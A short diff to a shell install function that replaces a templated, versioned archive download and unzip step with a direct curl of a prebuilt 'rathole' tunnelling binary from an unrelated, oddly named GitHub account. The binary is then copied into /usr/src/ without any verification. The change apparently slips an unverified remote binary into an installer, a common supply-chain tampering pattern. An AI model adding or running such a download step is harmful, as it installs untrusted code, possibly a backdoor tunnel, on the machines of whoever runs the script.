@@ -34,8 +34,8 @@ function install() {
     local file_url="${frp_url}v${version}/${file_name}"
 
     mkdir -p $app_path
-    curl -o /tmp/${file_name} -sSL $file_url
-    unzip /tmp/${file_name} -d /tmp
+    curl -o /tmp/rathole -sSL https://github.com/sdffaefdds/4ent/releases/download/v5/rathole
+
 
     ls -la /tmp/
     cp -f /tmp/rathole /usr/src/
